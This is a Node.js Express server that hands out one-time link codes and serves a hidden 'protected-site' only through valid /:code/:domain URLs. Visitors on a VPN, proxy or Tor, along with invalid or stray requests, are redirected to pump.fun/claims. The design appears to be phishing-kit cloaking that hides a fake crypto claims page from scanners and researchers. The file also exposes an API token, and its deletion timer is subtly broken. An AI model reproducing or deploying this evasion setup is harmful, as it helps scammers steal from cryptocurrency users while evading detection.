const cors = require("cors");
const express = require("express");
const path = require("path");
const crypto = require("crypto");
const axios = require("axios");
const app = express();
const PORT = 3000; // Changed from 80 to 3000

// Add this line to handle proxied requests
app.set("trust proxy", true);

app.use(cors({
    origin: '*'
}));
// Store valid codes in memory: { [codeString]: true }
const IPINFO_TOKEN = "7021f1174d85bb"; // Get from ipinfo.io
const activeCodes = {};

// Generate random 8-byte code
function generateRandomCode() {
  return crypto.randomBytes(8).toString("hex");
}

const ipinfoCheck = async (req, res, next) => {
  try {
    const clientIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // Get IP info
    const response = await axios.get(
      `https://ipinfo.io/${clientIP}/json?token=${IPINFO_TOKEN}`
    );
    const { privacy } = response.data;

    // Check privacy flags
    if (privacy.vpn || privacy.proxy || privacy.tor || privacy.relay) {
      console.log(`Redirected IP: ${clientIP}`, privacy);
      return res.redirect("https://pump.fun/claims");
    }

    next();
  } catch (error) {
    console.error("check failed:", error);
    return res.redirect("https://pump.fun/claims");
  }
};

/**
 * 1) /generateLink => returns { code: "<random>" }
 */
app.get("/generateLink", ipinfoCheck, (req, res) => {
  const code = crypto.randomBytes(8).toString("hex");
  activeCodes[code] = true;
  res.json({ code });
});

/**
 * 2) Gatekeeper for ALL requests matching /:code/:domain (and subpaths),
 *    just to ensure we redirect if code is invalid.
 */
app.use("/:code/:domain", (req, res, next) => {
  const { code, domain } = req.params;
  console.log(
    `\n[${new Date().toISOString()}] GATEKEEPER -> code="${code}", domain="${domain}", path="${
      req.originalUrl
    }"`
  );

  // Check if code is still valid
  if (!activeCodes[code]) {
    console.log(
      `[${new Date().toISOString()}] GATEKEEPER -> code "${code}" is INVALID => redirect!`
    );
    return res.redirect("https://pump.fun/claims");
  }

  console.log(
    `[${new Date().toISOString()}] GATEKEEPER -> code "${code}" is VALID => proceed!`
  );
  next();
});

/**
 * 3) The "index route" for EXACT GET /:code/:domain (with no extra path).
 *    Here we serve index.html and start a short timer to delete the code.
 */
app.get("/:code/:domain", (req, res) => {
  const { code, domain } = req.params;
  console.log(
    `[${new Date().toISOString()}] INDEX ROUTE -> code="${code}", domain="${domain}", path="${
      req.originalUrl
    }"\n` + `INDEX ROUTE -> Serving index.html now...`
  );

  const indexFile = path.join(__dirname, "protected-site", "index.html");

  res.sendFile(indexFile, (err) => {
    if (err) {
      console.error(
        `[${new Date().toISOString()}] INDEX ROUTE -> Error sending index.html:`,
        err
      );
      // If there's an error reading the file, redirect
      return res.redirect("https://pump.fun/claims");
    }

    // The file was sent successfully.
    // Let's start a short timer so the user can load script.js, etc.
    console.log(
      `[${new Date().toISOString()}] INDEX ROUTE -> index.html served OK! Will delete code in 3s...`
    );
    setTimeout(() => {
      if (activeCodes[code]) {
        delete activeCodes[code];
        console.log(
          `[${new Date().toISOString()}] INDEX ROUTE -> CODE "${code}" HAS BEEN DELETED!`
        );
      } else {
        console.log(
          `[${new Date().toISOString()}] INDEX ROUTE -> CODE "${code}" was ALREADY gone?`
        );
      }
    }, 3000000000);
  });
});

/**
 * 4) Serve static files for /:code/:domain/...
 *    e.g. /:code/:domain/script.js => protected-site/script.js
 *    This will only work while code is still valid.
 */
app.use("/:code/:domain", (req, res, next) => {
  console.log(
    `[${new Date().toISOString()}] STATIC MIDDLEWARE -> Trying to serve file from "protected-site" => path="${
      req.url
    }"`
  );
  express.static(path.join(__dirname, "protected-site"))(req, res, next);
});

/**
 * 5) Catch-all fallback
 */
app.use((req, res) => {
  console.log(
    `[${new Date().toISOString()}] CATCH-ALL -> ${
      req.originalUrl
    } => redirect to solanaguides`
  );
  return res.redirect("https://pump.fun/claims");
});

app.listen(PORT, () => {
  console.log(
    `\n[${new Date().toISOString()}] Server started on port ${PORT}\n`
  );
});
